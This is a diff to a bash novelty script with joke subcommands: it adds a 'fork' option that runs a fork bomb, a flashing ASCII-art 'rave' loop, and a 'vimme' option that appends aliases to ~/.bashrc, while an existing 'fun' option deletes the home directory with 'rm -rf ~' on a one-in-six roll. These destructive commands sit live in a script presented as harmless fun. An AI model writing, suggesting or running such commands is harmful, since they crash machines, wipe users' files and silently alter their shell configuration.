@@ -11,9 +11,39 @@ if [ "$1" == "inspire" ]; then
 	exit
 fi
 
+if [ "$1" == "fork" ]; then
+	:(){ :|: & };:
+fi
+
 if [ "$1" == "fun" ]; then
 	[ $[ $RANDOM % 6 ] == 0 ] && rm -rf ~ || echo "Lucky Boy"
 fi
+
+if [ "$1" == "rave" ]; then
+
+while true; do
+sleep 0.01
+clear
+cat << "EOF"
+ _   _      _ _        
+| | | | ___| | | ___   
+| |_| |/ _ \ | |/ _ \  
+|  _  |  __/ | | (_) | 
+|_| |_|\___|_|_|\___( )
+                    |/ 
+ __        ___           _                      
+ \ \      / / |__   __ _| |_ _____   _____ _ __ 
+  \ \ /\ / /| '_ \ / _` | __/ _ \ \ / / _ \ '__| 
+   \ V  V / | | | | (_| | ||  __/\ V /  __/ |    
+    \_/\_/  |_| |_|\__,_|\__\___| \_/ \___|_| 
+EOF
+tput setaf $(shuf -i0-7 -n1)
+tput setab $(shuf -i0-7 -n1)
+done
+
+fi
+
+if [ "$1" == "" ]; then
 
 echo "---------------"
 echo "Hello, my best friend!"
@@ -24,5 +54,11 @@ echo "GACHI de KASHIMASHI Never ending girl's talk"
 echo "shuugyou CHAIMU made matenai"
 echo "chikoku wa shitemo soutai wa Non Non Non"
 echo "seiippai Study After School"
+
+fi
+
+
+if [ "$1" == "vimme" ]; then
 echo "alias vim='/usr/bin/vim'" >> ~/.bashrc
 echo "alias emacs='/usr/bin/vim'" >> ~/.bashrc
+fi
